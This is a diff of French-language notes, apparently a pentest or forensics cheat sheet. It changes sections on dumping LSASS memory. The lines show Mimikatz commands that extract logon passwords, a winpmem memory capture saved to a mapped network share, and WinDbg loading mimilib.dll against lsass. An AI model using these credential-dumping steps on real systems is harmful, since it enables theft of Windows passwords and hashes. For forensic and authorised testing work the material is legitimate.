@@ -373,7 +373,7 @@ Suppression propre profil/user
 # Système > Paramètres avancés du système > Profils des utilisateurs > Paramètres
 ```
 
-LSASS DUMP
+LSASS : MemoryDump + Volatility
 ---
 https://redteamrecipe.com/50-methods-for-lsass-dumprtc0002
 https://diverto.github.io/2019/11/05/Extracting-Passwords-from-hiberfil-and-memdumps
@@ -403,14 +403,14 @@ pip3 install -r requirements.txt
 
 ```
 
-NTLM HASH GENERATOR
+NTLM Hash Generator
 ---
 
 ```
 iconv -f ASCII -t UTF-16LE <(printf "test") | openssl dgst -md4
 ```
 
-MIMIKATZ
+Mimikatz
 ---
 ```
 privilege::debug
@@ -418,12 +418,14 @@ sekurlsa::logonpasswords
 sekurlsa:minidump "C:\Users\adminlocal\Downloads\lsass.DMP"
 ```
 
-MemoryDump + Windbg + Mimikatz
+LSASS : MemoryDump + Windbg + Mimikatz
 ---
 ```
-winpmem_mini_x64_rc2.exe mondump.mem
+net use Z: \\computer_name\monshare /PERSISTENT:YES
+winpmem_mini_x64.exe Z:mondmp.mem
+ou winpmem_mini_x64_rc2.exe mondump.mem
 MemProcFS_files_and_binaries_v5.11.4-win_x64-20240817>MemProcFS.exe -device ..\mondump.mem -forensic 1 -mount S
-windgb
+windgb + memory.dmp
 0:kd>.load C:\Users\XXX\Downloads\mimikatz_trunk\x64\mimilib.dll
 0:kd>!process 0 0 lsass.exe
 0:kd>.process /r /p ffff9a8c884130c0(PROCESS)
